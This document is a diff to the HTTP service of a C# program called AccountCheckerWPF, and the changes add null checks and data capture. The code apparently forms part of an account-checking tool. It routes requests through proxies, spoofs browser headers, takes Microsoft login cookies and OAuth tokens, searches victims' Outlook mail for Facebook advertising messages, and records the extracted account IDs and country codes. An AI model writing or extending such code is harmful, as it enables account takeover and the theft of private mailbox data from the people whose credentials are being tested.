@@ -13,7 +13,7 @@ namespace AccountCheckerWPF.Services;
 public class HttpServices : IHttpServices
 {
     private readonly HttpClient _httpClient;
-    private readonly Proxy _proxy;
+    private readonly Proxy? _proxy;
 
     public HttpServices(ProxyManager proxyManager)
     {
@@ -48,7 +48,7 @@ public class HttpServices : IHttpServices
         }
         catch (Exception e)
         {
-            _proxy.InUse = false;
+            if (_proxy != null) _proxy.InUse = false;
             throw;
         }
     }
@@ -101,7 +101,7 @@ public class HttpServices : IHttpServices
         }
         catch (Exception e)
         {
-            _proxy.InUse = false;
+            if (_proxy != null) _proxy.InUse = false;
             throw;
         }
     }
@@ -130,12 +130,12 @@ public class HttpServices : IHttpServices
         }
         catch (Exception e)
         {
-            _proxy.InUse = false;
+            if (_proxy != null) _proxy.InUse = false;
             throw;
         }
     }
 
-    public async Task HandleLoginSuccessResponse(HttpResponseMessage postResponse, List<string> cookies)
+    public async Task HandleLoginSuccessResponse(HttpResponseMessage postResponse, List<string> cookies, Account account)
     {
         var cid = CommonHelper.GetCookieValue("MSPCID", cookies)?.ToUpper();
 
@@ -149,14 +149,25 @@ public class HttpServices : IHttpServices
             var json = JObject.Parse(getAccessTokenResponseBody);
             var accessToken = json["access_token"];
 
-            await ProcessEmailData(accessToken.ToString(), cid);
-            var jwtToken = await GetJwtTokenAsync(refreshToken, cid);
-            var userProfileJson = await GetUserProfileInfoAsync(jwtToken, cid);
-            var countryCode = ParseCountryCode(userProfileJson);
+            if (cid != null)
+            {
+                if (accessToken != null)
+                {
+                    await ProcessEmailData(accessToken.ToString(), cid, account);
+                }
+            
+                var jwtToken = await GetJwtTokenAsync(refreshToken, cid);
+                if (jwtToken != null)
+                {
+                    var userProfileJson = await GetUserProfileInfoAsync(jwtToken, cid);
+                    var countryCode = ParseCountryCode(userProfileJson);
+                    account.AddCaptureStr("CountryCode", countryCode);
+                }
+            }
         }
     }
 
-    private async Task ProcessEmailData(string accessToken, string cid)
+    private async Task ProcessEmailData(string accessToken, string cid, Account account)
     {
         var url =
             "https://outlook.office.com/api/beta/me/MailFolders/AllItems/messages?$select=Sender,Subject,From,CcRecipients,HasAttachments,Id,SentDateTime,ToRecipients,BccRecipients&$top=1000&$search=\"from:advertise-noreply@support.facebook.com\"";
@@ -180,7 +191,7 @@ public class HttpServices : IHttpServices
             var jsonResponse = JObject.Parse(responseBody);
 
             var subjects = jsonResponse["value"]
-                .Select(mail => mail["Subject"].ToString())
+                .Select(jToken => jToken["Subject"]?.ToString())
                 .ToList();
 
             foreach (var subject in subjects)
@@ -197,7 +208,7 @@ public class HttpServices : IHttpServices
 
                 foreach (var id in idMatches)
                 {
-                    Console.WriteLine($"Extracted ID: {id}");
+                    account.AddCaptureStr("ID", id);
                 }
             }
         }
@@ -212,7 +223,7 @@ public class HttpServices : IHttpServices
         return (source.Length - source.Replace(word, "").Length) / word.Length;
     }
 
-    private async Task<string> GetJwtTokenAsync(string refreshToken, string cid)
+    private async Task<string?> GetJwtTokenAsync(string refreshToken, string cid)
     {
         var url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token";
         
@@ -231,8 +242,7 @@ public class HttpServices : IHttpServices
             "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Opera GX\";v=\"102\"");
         _httpClient.DefaultRequestHeaders.Add("sec-ch-ua-mobile", "?0");
         _httpClient.DefaultRequestHeaders.Add("sec-ch-ua-platform", "\"Windows\"");
-
-        // Prepare the POST data
+        
         var postData = new List<KeyValuePair<string, string>>
         {
             new("client_id", "0000000048170EF2"),
@@ -253,14 +263,12 @@ public class HttpServices : IHttpServices
 
         try
         {
-            // Send the POST request
             var response = await _httpClient.PostAsync(url, content);
             response.EnsureSuccessStatusCode();
             var responseBody = await response.Content.ReadAsStringAsync();
 
-            // Parse the JWT from the response
             var jsonResponse = JObject.Parse(responseBody);
-            var jwtToken = jsonResponse["access_token"].ToString();
+            var jwtToken = jsonResponse["access_token"]?.ToString();
 
             return jwtToken;
         }
@@ -287,7 +295,6 @@ public class HttpServices : IHttpServices
 
         try
         {
-            // Send the GET request
             var response = await _httpClient.GetAsync(url);
             response.EnsureSuccessStatusCode();
             var responseBody = await response.Content.ReadAsStringAsync();
